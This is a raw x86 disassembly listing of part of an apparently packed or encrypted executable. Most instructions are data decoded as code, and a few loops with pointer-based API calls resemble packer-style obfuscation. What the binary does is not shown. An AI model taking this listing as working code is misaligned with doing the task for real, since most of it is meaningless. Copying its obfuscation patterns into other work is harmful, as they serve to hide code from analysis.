  405186:	fs nop
  405188:	xor    al,0xfa
  40518a:	ins    BYTE PTR es:[edi],dx
  40518b:	lds    esp,FWORD PTR [edx]
  40518d:	test   eax,0x655310e6
  405192:	adc    DWORD PTR [edx-0x52],edx
  405195:	ret    0x8a98
  405198:	jne    0x405156
  40519a:	and    eax,0x34621ab7
  40519f:	(bad)  
  4051a0:	ins    BYTE PTR es:[edi],dx
  4051a1:	add    DWORD PTR [ebp-0x767aa8a0],0x4a
  4051a8:	cmp    eax,0x16626583
  4051ad:	retf   0x9942
  4051b0:	repz dec edi
  4051b2:	out    dx,al
  4051b3:	sbb    eax,0xb27b0bd4
  4051b8:	lods   eax,DWORD PTR ds:[esi]
  4051b9:	ins    BYTE PTR es:[edi],dx
  4051ba:	cmp    al,0x6e
  4051bc:	icebp  
  4051bd:	shl    BYTE PTR [edx-0x49],cl
  4051c0:	jmp    0xac46:0xbf6b81d
  4051c7:	xor    dh,ch
  4051c9:	dec    eax
  4051ca:	fs int3 
  4051cc:	cmp    cl,bh
  4051ce:	(bad)  
  4051cf:	jno    0x4051f9
  4051d1:	out    0x2,eax
  4051d3:	push   ss
  4051d4:	jge    0x4051eb
  4051d6:	pusha  
  4051d7:	mov    ebp,esi
  4051d9:	mov    ch,0x4a
  4051db:	xlat   BYTE PTR ds:[ebx]
  4051dc:	jae    0x405160
  4051de:	mov    esp,0x6e6c9e51
  4051e3:	ret    
  4051e4:	sbb    eax,edx
  4051e6:	sbb    ecx,DWORD PTR [ebx+edx*8+0x49731a28]
  4051ed:	mov    bh,0x60
  4051ef:	push   ecx
  4051f0:	fsubp  st(4),st
  4051f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051f3:	pop    eax
  4051f4:	dec    ebx
  4051f5:	jmp    0xfca31ddd
  4051fa:	std    
  4051fb:	mov    BYTE PTR [edx-0x4fb5a123],0xf1
  405202:	mov    cl,0x11
  405204:	popf   
  405205:	iret   
  405206:	or     esp,DWORD PTR [ebp+esi*2+0x62ff4cf0]
  40520d:	(bad)  
  40520e:	in     al,dx
  40520f:	repz lds ecx,FWORD PTR [edi]
  405212:	push   ebp
  405213:	ins    BYTE PTR es:[edi],dx
  405214:	jbe    0x40528c
  405216:	mov    cl,0xe8
  405218:	stc    
  405219:	mov    bl,0xfb
  40521b:	cmp    al,0x12
  40521d:	dec    esi
  40521e:	retf   0xacc1
  405221:	pop    edi
  405222:	outs   dx,DWORD PTR ds:[esi]
  405223:	fld    DWORD PTR [esi-0x71]
  405226:	or     al,0x89
  405228:	ins    DWORD PTR es:[edi],dx
  405229:	ret    
  40522a:	(bad)  
  40522b:	verw   dx
  40522e:	ret    
  40522f:	cmp    eax,0x4f90b963
  405234:	push   cs
  405235:	lods   al,BYTE PTR ds:[esi]
  405236:	sahf   
  405237:	(bad)  
  405238:	dec    esp
  405239:	loope  0x405294
  40523b:	xchg   esi,eax
  40523c:	test   BYTE PTR [eax+0xc],bh
  40523f:	es jmp 0x40528c
  405242:	mov    BYTE PTR [edx],ah
  405244:	and    DWORD PTR [ebp-0x3889a16a],0x24249a4c
  40524e:	pop    ebx
  40524f:	and    al,0x1c
  405251:	pop    ds
  405252:	hlt    
  405253:	addr16 aad 0xaf
  405256:	aas    
  405257:	leave  
  405258:	dec    edi
  405259:	ja     0x4052b8
  40525b:	ja     0x40520c
  40525d:	pop    esi
  40525e:	xchg   edi,eax
  40525f:	mov    al,0xb8
  405261:	mov    ss,edi
  405263:	aas    
  405264:	shl    BYTE PTR [esi],1
  405266:	leave  
  405267:	imul   edi
  405269:	mov    edi,0x873acf9f
  40526e:	jmp    0x4052af
  405270:	sbb    al,0xe1
  405272:	pop    edi
  405273:	test   ch,ch
  405275:	repnz arpl WORD PTR [esi+0x40],si
  405279:	imul   eax,DWORD PTR [esi+0x5709bb76],0x45
  405280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405281:	pop    es
  405282:	lahf   
  405283:	xor    DWORD PTR [esi+ecx*2+0x57d89859],esp
  40528a:	sbb    al,0x47
  40528c:	inc    ecx
  40528d:	jno    0x40530b
  40528f:	xchg   ecx,eax
  405290:	mov    ch,0x78
  405292:	jle    0x4052f4
  405294:	push   ebp
  405295:	std    
  405296:	sub    bh,bl
  405298:	add    al,BYTE PTR [esi]
  40529a:	xlat   BYTE PTR ds:[ebx]
  40529b:	push   0x2c857e44
  4052a0:	push   esi
  4052a1:	fisub  DWORD PTR [ecx]
  4052a3:	pop    ebp
  4052a4:	cwde   
  4052a5:	mov    ds:0x8bd7af0f,al
  4052aa:	jge    0x405294
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4304a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4304a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4304a6,eax
  405305:	cmp    DWORD PTR ds:0x4304a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4304a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eaa8
  40533f:	cmp    DWORD PTR ds:0x4304a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4304a6
  405351:	inc    eax
  405352:	mov    ds:0x4304a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4304da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43056a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4304c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4304b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4304a6
  40538a:	add    DWORD PTR ds:0x42e772,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4304be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4304be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4304be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4304be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eba0
  4053c9:	cmp    DWORD PTR ds:0x4304be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42e9e4
  405405:	cmp    DWORD PTR ds:0x42ee14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0xcce70409
  405456:	mov    ah,0xd2
  405458:	and    al,0x7e
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x405404
  405460:	in     eax,0xd2
  405462:	push   ebx
  405463:	push   ecx
  405464:	ds mov cl,0xdc
  405467:	inc    edi
  405468:	xlat   BYTE PTR ds:[ebx]
  405469:	in     al,dx
  40546a:	lods   eax,DWORD PTR ds:[esi]
  40546b:	(bad)
  40546f:	repnz pop esp
  405471:	(bad)  [esi+ecx*2+0x74acbcf1]
  405478:	pop    edi
  405479:	cmp    DWORD PTR [eax+0x49],eax
  40547c:	jmp    0x4054bf
  40547e:	add    eax,DWORD PTR [ebx+0x184553ab]
  405484:	and    al,0xa1
  405486:	lods   eax,DWORD PTR ds:[esi]
  405487:	jl     0x405489
  405489:	clc    
  40548a:	stc    
  40548b:	xchg   ecx,eax
  40548c:	sbb    esi,ebx
  40548e:	aad    0x58
  405490:	xchg   ebp,eax
  405491:	adc    al,0xc4
  405493:	stos   BYTE PTR es:[edi],al
  405494:	lods   al,BYTE PTR ds:[esi]
  405495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405496:	and    DWORD PTR [ebp+0x69f9c25d],edx
  40549c:	cmp    eax,0x27b13102
  4054a1:	inc    esi
  4054a2:	idiv   BYTE PTR [esi+0x4c]
  4054a5:	stc    
  4054a6:	add    BYTE PTR [ebx+0x76],0x40
  4054aa:	push   fs
  4054ac:	iret   
  4054ad:	fs adc ebx,esi
  4054b0:	cmp    DWORD PTR [eax+0x24],0x1f6d4ef2
  4054b7:	mov    esp,0x2489dfe6
  4054bc:	retf   
  4054bd:	js     0x4054c7
  4054bf:	retf   0x9561
  4054c2:	sub    edx,edi
  4054c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054c5:	les    ebx,FWORD PTR [edi-0x2fdb3744]
  4054cb:	pop    DWORD PTR [edx+0x53058920]
  4054d1:	pushf  
  4054d2:	mov    cl,0x10
  4054d4:	xchg   edx,eax
  4054d5:	ret    0xe688
  4054d8:	stos   DWORD PTR es:[edi],eax
  4054d9:	add    DWORD PTR [edi],0xc601d9e3
  4054df:	inc    ebp
  4054e0:	popa   
  4054e1:	sti    
  4054e2:	add    BYTE PTR [ebx+0x4c],ah
  4054e5:	pop    esi
  4054e6:	rcl    DWORD PTR [eax-0x66],0xd7
  4054ea:	pop    edi
  4054eb:	mov    edi,0xed090d39
  4054f0:	leave  
  4054f1:	push   ecx
  4054f2:	dec    eax
  4054f3:	icebp  
  4054f4:	mov    ah,0xc6
  4054f6:	mov    esi,0x5cbdbaf2
  4054fb:	js     0x405571
  4054fd:	jl     0x40553b
  4054ff:	(bad)  
  405500:	adc    eax,0xe0889c58
  405505:	mov    esi,0xd01258cb
  40550a:	sub    BYTE PTR [edx],0x4b
  40550d:	std    
  40550e:	ins    DWORD PTR es:[di],dx
  405510:	cmp    BYTE PTR [eax-0x162338c],ch
  405516:	scas   eax,DWORD PTR es:[edi]
  405517:	mov    ah,bh
  405519:	bound  eax,QWORD PTR [esi]
  40551b:	mov    cl,0xda
  40551d:	xchg   ecx,eax
  40551e:	jecxz  0x405574
  405520:	addr16 pop ecx
  405522:	cmp    al,0xdf
  405524:	cmp    ch,bh
  405526:	loop   0x4054b6
  405528:	adc    edx,DWORD PTR [ebx]
  40552a:	inc    ebx
  40552b:	sbb    DWORD PTR [edi-0x41],esi
  40552e:	repz test BYTE PTR [edi-0x61],ah
  405532:	mov    dl,0x67
  405534:	mov    dl,0x7b
  405536:	mov    dh,0xe5
  405538:	fsubr  DWORD PTR [ecx+0x17]
  40553b:	add    bl,BYTE PTR [edx]
  40553d:	mov    BYTE PTR [edx+0x3ef12cd6],ch
  405543:	(bad)  
  405544:	xlat   BYTE PTR ds:[ebx]
  405545:	stos   DWORD PTR es:[edi],eax
  405546:	cmp    DWORD PTR [edi],ecx
  405548:	xor    BYTE PTR [ebp-0x57],ah
  40554b:	mov    al,0x21
  40554d:	or     al,0x76
  40554f:	mov    BYTE PTR [eax+edx*1],dh
  405552:	or     BYTE PTR [edx-0x30aa1648],al
  405558:	pop    ds
  405559:	cmp    cl,al
  40555b:	sub    eax,0xc2a798fa
  405560:	jp     0x4055d9
  405562:	aad    0x3d
  405564:	push   ds
  405565:	dec    ebx
  405566:	add    ah,ah
  405568:	jne    0x4055a9
  40556a:	sub    DWORD PTR [ebp-0x37],eax
  40556d:	add    BYTE PTR ds:0xa0fb7a63,ch
  405573:	aam    0x9e
  405575:	pop    ecx
  405576:	lods   al,BYTE PTR ds:[esi]
  405577:	call   0x7387e0ae
  40557c:	ret    0x689d
  40557f:	dec    edi
  405580:	sub    DWORD PTR [edx],ebp
  405582:	fild   WORD PTR [ebp+0x42]
  405585:	nop
  405586:	push   ss
  405587:	ins    BYTE PTR es:[edi],dx
  405588:	jmp    0xf0ab7d56
  40558d:	aaa    
  40558e:	test   BYTE PTR [ebx],0x4c
  405591:	pop    edi
  405592:	retf   0xe9f4
  405595:	retf   
  405596:	push   es
  405597:	loope  0x4055fa
  405599:	adc    BYTE PTR [ebp+0x41],bh
  40559c:	xchg   esp,eax
  40559d:	jmp    0x139f0c48
  4055a2:	cmc    
  4055a3:	push   0xffffffc4
  4055a5:	jnp    0x4055db
  4055a7:	cmp    bl,dl
  4055a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055aa:	stos   BYTE PTR es:[edi],al
  4055ab:	push   edi
  4055ac:	lock test esp,edi
  4055af:	and    al,0xe1
  4055b1:	inc    ebx
  4055b2:	xchg   edi,eax
  4055b3:	sbb    cl,BYTE PTR [edi+0x58a6ee00]
  4055b9:	stos   BYTE PTR es:[edi],al
  4055ba:	jecxz  0x405544
  4055bc:	cli    
  4055bd:	fisub  DWORD PTR [eax+edi*1-0x6d]
  4055c1:	outs   dx,DWORD PTR ds:[esi]
  4055c2:	push   ebx
  4055c3:	pop    ss
  4055c4:	and    al,0xff
  4055c6:	outs   dx,DWORD PTR ds:[esi]
  4055c7:	mov    dl,0x44
  4055c9:	cmp    eax,0xaacc33a5
  4055ce:	ret    
  4055cf:	pop    ss
  4055d0:	fisubr DWORD PTR [eax-0x55]
  4055d3:	jns    0x40563e
  4055d5:	cdq    
  4055d6:	xlat   BYTE PTR ds:[ebx]
  4055d7:	inc    esi
  4055d8:	mov    ebx,0x490070aa
  4055dd:	std    
  4055de:	xor    al,0xb6
  4055e0:	push   ebx
  4055e1:	add    BYTE PTR [edi-0x73026734],al
  4055e7:	push   ds
  4055e8:	xor    al,0xf4
  4055ea:	cmc    
  4055eb:	mov    ebx,0xa831d7b5
  4055f0:	adc    al,0x80
  4055f2:	add    DWORD PTR [ebp+0x52906e77],ecx
  4055f8:	inc    edx
  4055f9:	call   0xc37ce054
  4055fe:	ficom  DWORD PTR [edi]
  405600:	jns    0x405587
  405602:	adc    bl,BYTE PTR [eax+0x54]
  405605:	mov    al,ds:0x33b52ed0
  40560a:	loopne 0x405621
  40560c:	rcr    BYTE PTR [ebx],0x5b
  40560f:	sbb    DWORD PTR [ecx-0x15c4bd87],edi
  405615:	xchg   ecx,eax
  405616:	test   eax,0xa5bbec5
  40561b:	pop    ss
  40561c:	out    0x32,al
  40561e:	push   0xffffff96
  405620:	mov    edx,0x255c3859
  405625:	shl    DWORD PTR [ecx-0x66],0x2b
  405629:	enter  0x5478,0x87
  40562d:	call   0x1eac:0xf0fc4fa7
  405634:	ret    0xbc88
  405637:	adc    al,0x34
  405639:	sub    BYTE PTR [edx+0x19956d6c],ah
  40563f:	imul   ecx,DWORD PTR [edx-0x4f191ab8],0xffffffae
  405646:	(bad)  [edx-0x6d]
  405649:	imul   esp,edi,0xffffff8e
  40564c:	lea    edx,[edx+edx*4]
  40564f:	rol    ch,0x92
  405652:	mov    ds:0x68f6681,al
  405657:	repnz xlat BYTE PTR ds:[ebx]
  405659:	push   edx
  40565a:	icebp  
  40565b:	loopne 0x4056ac
  40565d:	nop
  40565e:	retf   0x1f2f
  405661:	es and eax,0xc9f10714
  405667:	jno    0x405664
  405669:	mov    ebp,0x795198a3
  40566e:	or     al,0xce
  405670:	aas    
  405671:	stc    
  405672:	pop    ds
  405673:	mov    esp,0xfc444881
  405678:	and    al,0x2c
  40567a:	js     0x4056cb
  40567c:	xchg   esi,eax
  40567d:	or     eax,0x52ccaa7e
  405682:	aad    0x80
  405684:	jns    0x4056d8
  405686:	dec    edi
  405687:	dec    eax
  405688:	push   0xa262f8a0
  40568d:	push   0x1a572b37
  405692:	sahf   
  405693:	jno    0x4056eb
  405695:	inc    edi
  405696:	inc    edi
  405697:	jp     0x40561a
  405699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40569a:	mov    BYTE PTR [ecx*4+0x2d7a94eb],0xa0
  4056a2:	aam    0x9d
  4056a4:	(bad)  
  4056a5:	xor    dh,ah
  4056a7:	sub    al,0xf6
  4056a9:	push   ds
  4056aa:	(bad)  [edx+0x7a259843]
  4056b0:	icebp  
  4056b1:	loop   0x40568d
  4056b3:	pop    edi
  4056b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b5:	sbb    DWORD PTR [esi],eax
  4056b7:	jb     0x4056f4
  4056b9:	add    BYTE PTR [edi+0x7c03b7a2],ch
  4056bf:	inc    eax
  4056c0:	scas   eax,DWORD PTR es:[edi]
  4056c1:	xchg   DWORD PTR [ebx-0x6b],edi
  4056c4:	xchg   edi,eax
  4056c5:	std    
  4056c6:	push   edi
  4056c7:	or     DWORD PTR [ebx-0x45],ebx
  4056ca:	daa    
  4056cb:	sub    ebp,esi
  4056cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ce:	cmp    eax,0xda3ecbe4
  4056d3:	sbb    al,0xbc
  4056d5:	ja     0x405705
  4056d7:	xor    eax,esp
  4056d9:	mov    ebx,es
  4056db:	ins    BYTE PTR es:[edi],dx
  4056dc:	dec    esi
  4056dd:	push   0xffffff87
  4056df:	mov    bh,0x30
  4056e1:	sub    BYTE PTR [edi+esi*1-0x246ecea6],ch
  4056e8:	fimul  DWORD PTR [ebx+0xe4fbf7f]
  4056ee:	inc    esp
  4056ef:	call   0xb1c552c5
  4056f4:	xor    eax,0x8f1cb7fa
  4056f9:	xor    esi,eax
  4056fb:	mov    WORD PTR [eax],?
  4056fd:	icebp  
  4056fe:	sub    DWORD PTR [ecx-0xb8ffa8b],ebp
  405704:	(bad)  
  405705:	in     al,dx
  405706:	fs or  edi,ebp
  405709:	add    ah,dh
  40570b:	(bad)  [edi+0x31ba1d97]
  405711:	fistp  WORD PTR [ebp-0x162d2001]
  405717:	inc    ecx
  405718:	(bad)  
  405719:	fsubp  st(7),st
  40571b:	mov    edi,0x4e35ca61
  405720:	outs   dx,BYTE PTR ds:[esi]
  405721:	ret    0xb618
  405724:	in     al,dx
  405725:	xchg   ebp,eax
  405726:	inc    BYTE PTR [edi]
  405728:	dec    ebp
  405729:	mov    DWORD PTR [edx+0x1f1fe118],ebx
  40572f:	int3   
  405730:	fidiv  DWORD PTR [ebx+0x64]
  405733:	and    BYTE PTR [edx-0x2c99ea8c],bh
  405739:	mov    bh,0xc5
  40573b:	sbb    BYTE PTR [ebx-0xfd2374a],ch
  405741:	les    esi,FWORD PTR [ecx]
  405743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405744:	leave  
  405745:	mov    bl,0xce
  405747:	sbb    al,0x13
  405749:	jae    0x4056d5
  40574b:	mov    al,ch
  40574d:	push   0xb78f267b
  405752:	fsubr  DWORD PTR [ebx-0x5c575449]
  405758:	sbb    BYTE PTR [eax-0xa917560],0x50
  40575f:	lahf   
  405760:	psubsw mm4,QWORD PTR [edi-0x5d952f8a]
  405767:	add    al,0x1f
  405769:	jnp    0x40572c
  40576b:	in     al,0xce
  40576d:	push   ebp
  40576e:	sub    al,0xe2
  405770:	rcl    DWORD PTR [ebx-0xeb46db4],cl
  405776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405777:	test   al,0xd8
  405779:	daa    
  40577a:	js     0x405767
  40577c:	ja     0x40572b
  40577e:	stc    
  40577f:	mov    ebx,DWORD PTR [eax+0x68]
  405782:	and    BYTE PTR [ecx+0x13],bl
  405785:	and    eax,0x7a9a7e1
  40578a:	(bad)  
  40578c:	stos   BYTE PTR es:[edi],al
  40578d:	aad    0xff
  40578f:	js     0x405721
  405791:	or     dh,bh
  405793:	hlt    
  405794:	(bad)  
  405795:	arpl   WORD PTR [esi+0x2a4b19cc],sp
  40579b:	ror    edi,1
  40579d:	mov    ch,0xdc
  40579f:	push   es
  4057a0:	repnz mov edi,0x722313a4
  4057a6:	jl     0x405736
  4057a8:	cli    
  4057a9:	xchg   ecx,eax
  4057aa:	cli    
  4057ab:	rep lods eax,DWORD PTR ds:[esi]
  4057ad:	shl    BYTE PTR [ebx],1
  4057af:	icebp  
  4057b0:	adc    BYTE PTR [ecx-0x7055c23d],ch
  4057b6:	imul   edx,DWORD PTR [esi+0x69],0x11
  4057ba:	imul   esi,DWORD PTR [ecx],0x1d
  4057bd:	stos   DWORD PTR es:[edi],eax
  4057be:	mov    ebp,0x57250cf4
  4057c3:	pusha  
  4057c4:	dec    ebx
  4057c5:	pop    eax
  4057c6:	push   edx
  4057c7:	and    al,0x22
  4057c9:	add    ch,BYTE PTR [ecx-0xf]
  4057cc:	mov    ds:0x8d6ddf44,al
  4057d1:	pop    esi
  4057d2:	add    bl,dl
  4057d4:	sbb    esp,esi
  4057d6:	pop    ebp
  4057d7:	sbb    ch,BYTE PTR [esi*1-0x483e73a9]
  4057de:	sbb    cl,BYTE PTR [ecx]
  4057e0:	in     al,dx
  4057e1:	inc    esi
  4057e2:	mov    eax,0xff26a306
  4057e7:	rcr    DWORD PTR [ebp+0x18],1
  4057ea:	pusha  
  4057eb:	in     al,dx
  4057ec:	mov    cl,BYTE PTR [ecx-0x5247e4f5]
  4057f2:	in     al,0x75
  4057f4:	inc    ebp
  4057f5:	push   esi
  4057f6:	mov    BYTE PTR [ecx+0x395dd3bc],ah
  4057fc:	arpl   WORD PTR [esi+edx*1],bx
  4057ff:	cmp    ecx,edi
  405801:	pop    ebp
  405802:	mov    DWORD PTR [esi],esi
  405804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405805:	or     eax,0x9b9c25cd
  40580a:	test   al,0xa8
  40580c:	add    BYTE PTR [edi-0x16],ah
  40580f:	fiadd  DWORD PTR [ebx+0x175bae90]
  405815:	cwde   
  405816:	das    
  405817:	cld    
  405818:	xor    al,0x77
  40581a:	ins    DWORD PTR es:[edi],dx
  40581b:	retf   0xf66c
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x39e65bc4],bh
  405847:	jmp    0x40585a
  405849:	cmp    BYTE PTR [esi+0x7e],bh
  40584c:	mov    ebp,0x237e7e71
  405851:	mov    al,ds:0xed350d7b
  405856:	loope  0x4058c6
  405858:	fbstp  TBYTE PTR ds:0xf9cc840c
  40585e:	jg     0x4058cb
  405860:	fldenv [esi-0x3f]
  405863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405865:	mov    dl,0x2e
  405867:	into   
  405868:	leave  
  405869:	ret    0xde4
  40586c:	int3   
  40586d:	scas   al,BYTE PTR es:[edi]
  40586e:	pop    eax
  40586f:	sbb    BYTE PTR [edx-0x9],ch
  405872:	sub    BYTE PTR [ebx*4+0x2834f54f],bl
  405879:	pusha  
  40587a:	xchg   edi,eax
  40587b:	sahf   
  40587c:	dec    esi
  40587d:	and    DWORD PTR [ecx],esp
  40587f:	test   al,0xe7
  405881:	aas    
  405882:	std    
  405883:	mov    dl,ch
  405885:	inc    ebp
  405886:	std    
  405887:	in     eax,dx
  405888:	sub    al,0x55
  40588a:	(bad)
  40588e:	mov    edx,0x4f58c98a
  405893:	lods   eax,DWORD PTR ds:[esi]
  405894:	fwait
  405895:	in     eax,dx
  405896:	cmp    bh,dl
  405898:	test   DWORD PTR [esi],ebp
  40589a:	or     al,0x99
  40589c:	into   
  40589d:	inc    edx
  40589e:	shr    ah,1
  4058a0:	mov    DWORD PTR [esi],ebp
  4058a2:	jl     0x4058f3
  4058a4:	pop    ds
  4058a5:	and    DWORD PTR [edi+0x2a],edx
  4058a8:	jmp    0x7a10f56b
  4058ad:	dec    esi
  4058ae:	dec    eax
  4058af:	stc    
  4058b0:	sbb    al,0xbd
  4058b2:	jmp    0x7ca9:0xaafb408c
  4058b9:	stos   BYTE PTR es:[edi],al
  4058ba:	xchg   edx,eax
  4058bc:	xchg   ebx,eax
  4058bd:	fist   WORD PTR [edi+0x79]
  4058c0:	lock mov dh,0xe8
  4058c3:	jp     0x40584f
  4058c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c6:	push   0xffffffbb
  4058c8:	mov    ch,0x9b
  4058ca:	popa   
  4058cb:	cdq    
  4058cc:	jne    0x405853
  4058ce:	pop    ebx
  4058cf:	or     cl,ch
  4058d1:	rcr    DWORD PTR [ebx],0x14
  4058d4:	outs   dx,BYTE PTR ds:[esi]
  4058d5:	jb     0x405948
  4058d7:	mov    bh,0xe8
  4058d9:	std    
  4058da:	pop    es
  4058db:	cmp    BYTE PTR [ecx-0x4eee7792],dh
  4058e1:	popa   
  4058e2:	lea    edx,[ecx-0x7e]
  4058e5:	mov    al,ds:0x54ddde6c
  4058ea:	mov    DWORD PTR [ecx-0x67],0x55792eea
  4058f1:	add    bh,BYTE PTR [edi]
  4058f3:	jg     0xed804154
  4058f9:	adc    ch,BYTE PTR [ebx+edx*8-0x1dd06a42]
  405900:	sbb    BYTE PTR [ebx],al
  405902:	not    DWORD PTR gs:[edx-0x42604e59]
  405909:	xchg   esp,eax
  40590a:	push   ebp
  40590b:	ss mov edx,0x786e99aa
  405911:	pop    es
  405912:	aaa    
  405913:	push   ss
  405914:	push   eax
  405915:	push   eax
  405916:	push   esp
  405917:	das    
  405918:	sbb    al,BYTE PTR ds:0xd9752b5c
  40591e:	push   ds
  40591f:	test   eax,0x8a6bafbe
  405924:	fwait
  405925:	fs xchg ecx,eax
  405927:	aam    0x8a
  405929:	add    ebx,DWORD PTR [esi+0x5961d23d]
  40592f:	mov    cl,0xd6
  405931:	(bad)
  405935:	or     al,BYTE PTR ds:0x7e4374b4
  40593b:	mov    esp,esp
  40593d:	adc    al,0xe4
  40593f:	xchg   ebx,eax
  405940:	sahf   
  405941:	or     eax,0x5fd9c656
  405946:	jns    0x405982
  405948:	jne    0x40595d
  40594a:	js     0x40592b
  40594c:	inc    ebp
  40594d:	shr    dh,0xe4
  405950:	mov    dl,0xb2
  405952:	dec    esi
  405953:	jmp    0x4058f8
  405955:	lahf   
  405956:	js     0x405942
  405958:	and    BYTE PTR [edx-0x60],ah
  40595b:	aad    0x10
  40595d:	dec    ecx
  40595e:	xchg   esi,eax
  40595f:	in     eax,0x6c
  405961:	or     DWORD PTR [ebx],ebp
  405963:	and    al,BYTE PTR [esi+0x59]
  405966:	mov    al,0x42
  405968:	js     0x405914
  40596a:	jp     0x4059aa
  40596c:	ficom  WORD PTR [ebx+0x392d4fde]
  405972:	push   ecx
  405973:	jae    0x4059a4
  405975:	or     eax,0x5ec180f7
  40597a:	imul   ecx,esi,0x7d
  40597d:	sub    al,0x1a
  40597f:	add    edi,DWORD PTR [ebx+0x48]
  405982:	push   esi
  405983:	hlt    
  405984:	pop    edx
  405985:	rol    BYTE PTR [edx+eiz*1+0x1],0x2c
  40598a:	cdq    
  40598b:	in     al,0x10
  40598d:	out    dx,eax
  40598e:	aaa    
  40598f:	nop
  405990:	fiadd  WORD PTR [esp+ecx*4-0x7e]
  405994:	mov    ds:0x3651c0cb,eax
  405999:	shr    BYTE PTR [edx],cl
  40599b:	inc    ebx
  40599c:	xchg   ebp,eax
  40599d:	(bad)
  4059a0:	stos   DWORD PTR es:[edi],eax
  4059a1:	xchg   DWORD PTR [edx-0x24],edi
  4059a4:	test   BYTE PTR [esi-0x3],ch
  4059a7:	(bad)  
  4059a8:	(bad)  [edi-0x12]
  4059ab:	cmp    DWORD PTR [ebp-0x7],edx
  4059ae:	outs   dx,DWORD PTR ds:[esi]
  4059af:	add    DWORD PTR [ebp+0x78098126],edx
  4059b5:	mov    ds:0x48708f55,eax
  4059ba:	stc    
  4059bb:	shl    BYTE PTR [edx-0x4c],cl
  4059be:	leave  
  4059bf:	pop    ds
